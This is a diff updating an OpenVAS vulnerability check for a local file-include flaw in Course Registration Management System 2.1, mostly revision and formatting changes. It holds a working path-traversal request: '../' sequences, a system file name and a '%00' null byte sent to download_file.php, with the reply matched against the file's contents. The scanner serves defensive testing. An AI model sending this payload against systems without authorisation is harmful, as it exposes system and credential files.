@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_coursems_46495.nasl 5648 2017-03-21 09:52:17Z cfi $
+# $Id: gb_coursems_46495.nasl 5747 2017-03-28 12:18:28Z cfi $
 #
 # Course MS Cross Site Scripting, SQL Injection and Local File Include Vulnerabilities
 #
@@ -40,12 +40,11 @@ exploit latent vulnerabilities in the underlying database.
 Course Registration Management System 2.1 is vulnerable; other
 versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(103088);
- script_version("$Revision: 5648 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 10:52:17 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5747 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 14:18:28 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-02-23 13:14:43 +0100 (Wed, 23 Feb 2011)");
  script_bugtraq_id(46495);
  script_tag(name:"cvss_base", value:"7.5");
@@ -57,7 +56,6 @@ if (description)
  script_xref(name : "URL" , value : "http://sourceforge.net/projects/coursems/");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if Course Registration Management System is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -71,28 +69,25 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
 files = traversal_files();
 
-dirs = make_list("/coursems",cgi_dirs());
+foreach dir( make_list_unique( "/coursems", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
 
-    url = string(dir, "/download_file.php?path=",crap(data:"../",length:6*9),files[file],"%00"); 
-
-
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
-
+    url = string(dir, "/download_file.php?path=",crap(data:"../",length:6*9),files[file],"%00");
+    if(http_vuln_check(port:port, url:url, pattern:file)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
+
+exit( 99 );
